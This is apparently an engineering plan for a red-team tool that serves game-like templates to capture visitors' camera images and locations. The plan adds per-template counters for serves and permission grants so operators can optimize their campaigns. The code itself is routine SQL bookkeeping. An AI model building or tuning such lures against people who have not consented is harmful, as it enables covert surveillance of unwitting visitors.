# Plan 007: Template Analytics — Implement Counter Columns

> **Executor instructions**: Follow step by step. Run every verification
> command before moving to the next step.
>
> **Drift check**: `git diff --stat 68a5f01..HEAD -- backend/src/`

## Status

- **Priority**: P3
- **Effort**: M
- **Risk**: LOW
- **Depends on**: 004 (TrailBase cleanup determines whether analytics write to SQLite only or both)
- **Category**: feature
- **Planned at**: commit `68a5f01`, 2026-06-21

## Why this matters

The `templates` schema has four analytics columns: `total_served`, `total_camera_grants`, `total_location_grants`, `avg_engagement_seconds`. None are ever incremented. Red teamers can't measure template effectiveness — which templates get camera access, which have highest engagement — so they can't optimize their campaigns.

## Current state

```sql
-- backend/migrations/001_init.sql:86-97
CREATE TABLE IF NOT EXISTS templates (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    description TEXT,
    file_path TEXT NOT NULL,
    category TEXT DEFAULT 'game',
    total_served INTEGER DEFAULT 0,         -- never updated
    total_camera_grants INTEGER DEFAULT 0,  -- never updated
    total_location_grants INTEGER DEFAULT 0,-- never updated
    avg_engagement_seconds REAL DEFAULT 0,  -- never updated
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
```

```rust
// backend/src/templates.rs:28-32 — INSERT OR REPLACE doesn't set analytics columns
sqlx::query(
    "INSERT OR REPLACE INTO templates (id, name, description, file_path, created_at) VALUES (?, ?, ?, ?, ?)"
)
```

## Commands you will need

| Purpose | Command | Expected |
|---------|---------|----------|
| Check Rust | `cargo check` | exit 0 |

## Scope

**In scope**:
- `backend/src/templates.rs` — add analytics update when template is served
- `backend/src/capture.rs` — increment camera/location counters when permissions granted
- `backend/src/api/mod.rs` — show analytics in template list endpoint
- `backend/migrations/001_init.sql` — keep existing schema (analytics columns already exist)

**Out of scope**:
- Frontend analytics dashboard (future work)
- Per-session engagement tracking (requires session start/end events)

## Git workflow

- Branch: `plan/007-template-analytics`
- Commits: `feat(analytics): increment total_served on template serve`, `feat(analytics): increment camera/location grants on capture`, `feat(api): expose template analytics in list endpoint`

## Steps

### Step 1: Increment `total_served` when a template is served

In `backend/src/templates.rs`, in the `serve_template` function, after successfully serving a template (line 88), add:

```rust
// After the response is built, fire-and-forget the analytics update:
let id = template_id.clone();
let pool = state.pool.clone();
tokio::spawn(async move {
    let _ = sqlx::query("UPDATE templates SET total_served = total_served + 1 WHERE id = ?")
        .bind(&id)
        .execute(&pool)
        .await;
});
```

This is fire-and-forget so it doesn't block the response. Use this pattern (not `.await` in the main handler) to avoid adding latency.

**Verify**: `cargo check` → exit 0

### Step 2: Increment camera/location grants

In `backend/src/capture.rs`, in `receive_location` (line 115), find where the location is successfully stored (after the INSERT at line 139). Add:

```rust
// After successful location insert, increment template counter:
if let Some(template_id) = get_session_template(&state, &session_id).await {
    let pool = state.pool.clone();
    tokio::spawn(async move {
        let _ = sqlx::query("UPDATE templates SET total_location_grants = total_location_grants + 1 WHERE id = ?")
            .bind(&template_id)
            .execute(&pool)
            .await;
    });
}
```

In `receive_image` (line 108), after successful image insert:

```rust
// After successful image capture, increment camera counter:
if let Some(template_id) = get_session_template(&state, &session_id).await {
    let pool = state.pool.clone();
    tokio::spawn(async move {
        let _ = sqlx::query("UPDATE templates SET total_camera_grants = total_camera_grants + 1 WHERE id = ?")
            .bind(&template_id)
            .execute(&pool)
            .await;
    });
}
```

Add a helper function to look up template by session:
```rust
async fn get_session_template(state: &AppState, session_id: &str) -> Option<String> {
    sqlx::query_scalar("SELECT template_id FROM sessions WHERE id = ?")
        .bind(session_id)
        .fetch_optional(&state.pool)
        .await
        .ok()
        .flatten()
}
```

**Verify**: `cargo check` → exit 0

### Step 3: Expose analytics in template list

In `backend/src/api/mod.rs`, update the `TemplateInfo` struct:

```rust
#[derive(Serialize)]
pub struct TemplateInfo {
    id: String,
    name: String,
    description: Option<String>,
    created_at: i64,
    total_served: i64,             // add
    total_camera_grants: i64,      // add
    total_location_grants: i64,    // add
    avg_engagement_seconds: f64,   // add
}
```

Update the query in `list_templates` to include these columns (around line 275):

```rust
let rows: Vec<(String, String, Option<String>, i64, i64, i64, i64, f64)> = sqlx::query_as(
    "SELECT id, name, description, created_at, total_served, total_camera_grants, total_location_grants, avg_engagement_seconds FROM templates ORDER BY name"
).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

let templates: Vec<TemplateInfo> = rows.into_iter().map(|(id, name, description, created_at, total_served, total_camera_grants, total_location_grants, avg_engagement_seconds)| {
    TemplateInfo { id, name, description, created_at, total_served, total_camera_grants, total_location_grants, avg_engagement_seconds }
}).collect();
```

**Verify**: `cargo check` → exit 0

## Test plan

- No test framework exists. Manual verification:
  1. Hit `/t/face-runner` → check DB: `SELECT total_served FROM templates WHERE id='face-runner'` → incremented by 1
  2. Grant camera → check DB: `SELECT total_camera_grants FROM templates` → incremented
  3. Hit `GET /api/templates` → response includes new analytics fields

## Done criteria

- [ ] `cargo check` exits 0
- [ ] `cargo test` exits 0
- [ ] `SELECT total_served FROM templates WHERE id='face-runner'` increments on each template serve
- [ ] `SELECT total_camera_grants FROM templates` increments on camera capture
- [ ] `SELECT total_location_grants FROM templates` increments on location capture
- [ ] `GET /api/templates` returns `total_served`, `total_camera_grants`, `total_location_grants`, `avg_engagement_seconds` fields
- [ ] `plans/README.md` status row updated

## STOP conditions

- The `INSERT OR REPLACE INTO templates` in `scan_and_register` resets analytics to 0 on every app restart (because it replaces the row, losing the incremented values). Fix: change to `INSERT INTO ... ON CONFLICT(id) DO UPDATE SET file_path=excluded.file_path, description=excluded.description, name=excluded.name` to preserve counters.

## Maintenance notes

- The fire-and-forget `tokio::spawn` pattern means analytics updates are best-effort — they may be lost on crash during the update. For a red-team tool this is acceptable.
- `avg_engagement_seconds` requires tracking session duration (start time on page load, end time on unload). This is NOT implemented in this plan — the column stays at 0 until session timing is added.
- The `INSERT OR REPLACE` issue in `scan_and_register` must be fixed FIRST (change to upsert), otherwise counters reset on every deploy that triggers a template rescan.
